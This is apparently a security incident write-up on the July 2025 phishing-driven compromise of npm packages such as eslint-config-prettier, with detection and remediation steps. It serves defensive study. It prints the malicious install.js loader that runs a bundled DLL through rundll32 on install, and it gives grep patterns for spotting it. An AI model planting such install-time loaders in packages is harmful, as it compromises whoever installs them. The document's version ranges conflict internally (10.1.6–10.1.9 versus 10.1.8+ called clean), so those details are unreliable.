# eslint-config-prettier / JounQin Phishing Campaign

**Date:** July 2025
**Ecosystem:** npm
**Severity:** High
**Type:** Phishing-enabled maintainer account takeover / Windows DLL dropper / Infostealer
**Sources:**
- [StepSecurity — Supply Chain Security Alert: eslint-config-prettier Package Shows Signs of Compromise](https://www.stepsecurity.io/blog/supply-chain-security-alert-eslint-config-prettier-package-shows-signs-of-compromise)

---

## Summary

On July 18, 2025, JounQin — a prolific npm maintainer responsible for `eslint-config-prettier`, `eslint-plugin-prettier`, and a cluster of widely-used formatting and tooling packages — disclosed that his npm account had been compromised via a sophisticated phishing email. The attacker added a malicious npm publish token and used it to release multiple backdoored versions of at least seven packages, collectively installed hundreds of thousands of times per week.

The malicious versions contained an `install.js` script that, on Windows, silently executed `node-gyp.dll` — an attacker-controlled Windows DLL disguised as a native build-tool component. The CVE assigned to the primary package compromise is **CVE-2025-54313**. The incident was first surfaced publicly via a GitHub issue by security researcher Cedric Brisson, and the maintainer confirmed the breach the same day via X (formerly Twitter).

This attack was the opening move in a sustained phishing campaign targeting npm maintainers throughout mid-2025. It subsequently expanded to compromise the `is` package (July 19, 2025) and the `got-fetch` package through the same `npnjs[.]com` phishing domain, before the campaign was attributed as background context to the broader Shai-Hulud worm activity later that year.

---

## Compromised Artifacts

| Package | Malicious Version(s) | Notes |
|---------|---------------------|-------|
| `eslint-config-prettier` | 8.10.1, 9.1.1, 10.1.6, 10.1.7 | CVE-2025-54313; primary target |
| `eslint-plugin-prettier` | 4.2.2, 4.2.3 | Same maintainer account |
| `snyckit` | 0.11.9 | Same maintainer account |
| `@pkgjs/core` | 0.2.8 | Same maintainer account |
| `napi-postinstall` | 0.3.1 | Same maintainer account |
| `is` | 3.3.1, 5.0.0 | Campaign expansion — July 19, 2025 (separate entry: [2025-07-is-package-compromise.md](./2025-07-is-package-compromise.md)) |
| `got-fetch` | 5.1.11, 5.1.12 | Campaign expansion; "Pycoon" infostealer via `crashreporter.dll` |

All affected versions were marked as deprecated on npm; clean replacement versions were published by the maintainer.

---

## How It Worked

### Entry Point — Phishing the Maintainer

The attacker sent JounQin a sophisticated phishing email impersonating npm support using the domain `npnjs[.]com` — a lookalike for `npmjs.com`. The email convincingly requested account action, leading the maintainer to inadvertently expose or approve addition of a new npm publish token. The attacker then used this token to publish malicious versions of every package under JounQin's npm account.

The phishing domain `npnjs[.]com` was later identified as the same domain used in subsequent campaign expansions targeting the `is` and `got-fetch` maintainers. This suggests a single threat actor running a systematic campaign against high-value npm maintainers, choosing targets based on download volume and ecosystem centrality.

### Payload Mechanics

The malicious versions added an `install.js` file to the package that was executed automatically on `npm install`. The relevant payload segment (Windows-only):

```javascript
if (os.platform() === 'win32') {
  const tempDir = os.tmpdir();
  require('child_process')["spawn"]("rundll32", [
    path.join(__dirname, './node-gyp' + '.dll') + ",main"
  ]);
}
```

The code uses **string concatenation obfuscation** (`'chi'+'ld_pro'+'cess'`, `"sp"+"awn"`, `"rund"+"ll32"`) to evade static analysis tools. The payload:

1. Detects if the OS is Windows
2. Locates `node-gyp.dll` bundled in the package directory (disguised as a native Node.js build tool)
3. Executes the DLL's `main` export via `rundll32.exe` — a built-in Windows utility, making it a **Living off the Land** (LOLBin) technique
4. The DLL's exact payload was not fully disclosed, but based on context and CVE description it performs credential harvesting and exfiltration

The `got-fetch` expansion used a distinct malware binary: `crashreporter.dll`, identified as the **"Pycoon" information stealer**, also Windows-only.

### Discovery and Detection Pattern

The attack was first identified because versions `10.1.6` through `10.1.9` of `eslint-config-prettier` were published to npm with **no corresponding code changes** in the GitHub repository — a pattern of "silent version bumps" that StepSecurity's Artifact Monitor was designed to surface. Security researcher Cedric Brisson noticed the discrepancy and opened a GitHub issue; community member `martincostello` then identified the DLL installation in the diff.

### Automated Tool Amplification

Automated dependency management tools (Dependabot and Renovate) automatically created pull requests upgrading projects to the compromised versions. In several cases these PRs were merged before the compromise was known, meaning the malicious install scripts ran in CI/CD environments.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| ~July 18, 2025 | Attacker phishes JounQin via `npnjs[.]com` phishing domain; malicious npm token added |
| July 18, 2025 | Malicious versions of eslint-config-prettier, eslint-plugin-prettier, and other packages published |
| July 18, 2025 | Security researcher Cedric Brisson opens GitHub issue flagging discrepancy between npm versions and repo commits |
| July 18, 2025 | `martincostello` identifies DLL installation in the package diff |
| July 18, 2025 | JounQin confirms compromise via X: "I was tricked by a phishing email and a new npm token was added and leaked" |
| July 18, 2025 | Affected versions deprecated; clean replacements published |
| July 18, 2025 | NVD assigns CVE-2025-54313 |
| July 19, 2025 | Same campaign expands to `is` package (separate incident) |
| Later July 2025 | Checkmarx discovers `got-fetch` compromise (5.1.11, 5.1.12) via same phishing domain; "Pycoon" infostealer |

---

## Detection

```bash
# Check for all affected eslint-config-prettier versions
npm ls eslint-config-prettier
# Malicious versions: 8.10.1, 9.1.1, 10.1.6, 10.1.7
# Safe: upgrade to latest (10.1.8+ clean versions)

# Check all compromised packages in one pass
npm ls eslint-config-prettier eslint-plugin-prettier snyckit napi-postinstall got-fetch is

# Scan package-lock.json for malicious versions
grep -E '"eslint-config-prettier"' package-lock.json
grep -E '"eslint-plugin-prettier"' package-lock.json
grep -E '"got-fetch"' package-lock.json

# Look for the malicious DLL in npm cache or node_modules
find ./node_modules -name "node-gyp.dll" 2>/dev/null
find ./node_modules -name "crashreporter.dll" 2>/dev/null

# Check Windows temp directory for evidence of execution (PowerShell)
# Get-ChildItem $env:TEMP | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-30)}

# Scan for the obfuscated spawn pattern in installed package files
grep -r "ild_pro" ./node_modules --include="*.js" 2>/dev/null
grep -r "rundll32" ./node_modules --include="*.js" 2>/dev/null

# Verify package integrity against known-good hashes
# Check that eslint-config-prettier versions have repo-matching commits on GitHub
```

---

## Remediation

1. **Identify exposure**: Run `npm ls eslint-config-prettier eslint-plugin-prettier snyckit napi-postinstall got-fetch is` and compare versions against the malicious list above
2. **Remove and reinstall**: `rm -rf node_modules package-lock.json && npm install` after pinning to safe versions
3. **Clear npm cache**: `npm cache clean --force`
4. **Check for DLLs**: Scan your machine and CI/CD environments for `node-gyp.dll` and `crashreporter.dll` in npm-related paths
5. **Rotate Windows credentials**: If a compromised version ran on Windows, assume all credentials accessible to the installing process (env vars, SSH keys, CI/CD tokens) are compromised and rotate immediately
6. **Audit automated PRs**: Review merged Dependabot/Renovate PRs that upgraded to the affected version ranges during or after July 18, 2025
7. **Audit CI/CD logs**: Look for unexpected `rundll32` process invocations or unusual outbound network connections in build logs

---

## Lessons Learned

- **Silent version bumps are a high-confidence compromise signal.** Multiple new versions published to npm with zero corresponding repository commits is an indicator of unauthorized publication — exactly the pattern that led to rapid discovery here.
- **Automated dependency tools amplify blast radius.** Dependabot and Renovate auto-create and auto-merge upgrade PRs, meaning malicious package versions can silently reach production CI/CD environments within hours of publication, before any human review.
- **LOLBin techniques (rundll32) evade traditional security tools.** Using a Windows built-in (`rundll32`) to execute a DLL means the process looks legitimate and many EDR tools allow it by default.
- **Phishing domain lookalikes are highly effective against developers.** `npnjs[.]com` vs `npmjs.com` — a transposed character — is convincing even to experienced maintainers who interact with npm support regularly.
- **One compromised maintainer account unlocks many packages.** JounQin maintained a large cluster of related packages under his npm account. A single successful phish compromised all of them simultaneously.
- **The same campaign can re-use infrastructure across multiple targets.** The `npnjs[.]com` domain was used against multiple maintainers, suggesting a systematic, organized operation rather than opportunistic attacks.

---

## Related Incidents

- [npm 'is' Package Compromise (Jul 2025)](./2025-07-is-package-compromise.md) — direct continuation of the same phishing campaign
- [The Great npm Heist (Sep 2025)](./2025-09-great-npm-heist.md) — similar phishing-of-maintainer technique; same month's threat landscape
- [Cline Supply Chain Attack (Feb 2026)](./2026-02-cline-openclaw.md) — similar unauthorized npm publish pattern detected via provenance anomaly
